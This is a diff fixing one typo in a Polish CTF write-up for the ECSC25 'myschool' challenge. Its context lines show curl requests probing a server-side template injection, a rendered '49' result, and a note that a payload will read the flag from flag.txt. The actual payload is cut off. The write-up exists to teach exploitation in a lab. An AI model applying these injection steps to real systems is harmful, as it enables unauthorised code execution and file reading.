@@ -127,7 +127,7 @@ Następnie robimy request `GET` z podanym `session_id`
 stigs@stigsec:~$ curl -X GET https://myschool.ecsc25.hack.cert.pl/users/?session_id=4cc2c6f4-2ae3-40f1-81fc-ef6a8998172c
 "Welcome test, test bio!\nWelcome test , 49!"
 ```
-Jak widać payloadm został wyrenderowany, więc zdobycie flagi to kwestia doboru payloadu który odczyta flagę z `flag.txt`:
+Jak widać payload został wyrenderowany, więc zdobycie flagi to kwestia doboru payloadu który odczyta flagę z `flag.txt`:
 ```bash
 stigs@stigsec:~$ curl -X POST https://myschool.ecsc25.hack.cert.pl/users/ \
   -H "Content-Type: application/json" \
